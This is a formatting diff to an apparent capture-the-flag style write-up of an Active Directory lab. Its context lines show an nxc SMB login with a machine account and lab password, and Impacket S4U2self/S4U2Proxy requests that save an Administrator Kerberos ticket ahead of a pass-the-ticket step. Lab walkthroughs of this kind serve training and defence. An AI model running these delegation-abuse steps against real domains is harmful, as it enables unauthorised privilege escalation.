@@ -1243,7 +1243,8 @@ Authenticate:
 (myvenv) ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Defense/bloodyAD/targetedKerberoast/SSHlog]─[10.200.96.99]
 └──╼ $ nxc smb -k DC.hsm-defense.local -u 'ITOPS01$' -p 'paSSword2459' --shares
 SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
-SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\ITOPS01$:paSSword2459 ```
+SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\ITOPS01$:paSSword2459
+
 ```
 ---
 
@@ -1352,6 +1353,7 @@ Impacket v0.14.0.dev0+20260916.40533.c38d1eeb - Copyright Fortra, LLC and its af
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
 [*] Saving ticket in Administrator@ldap_DC.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache
+
 ```
 
 ### Pass-the-Ticket
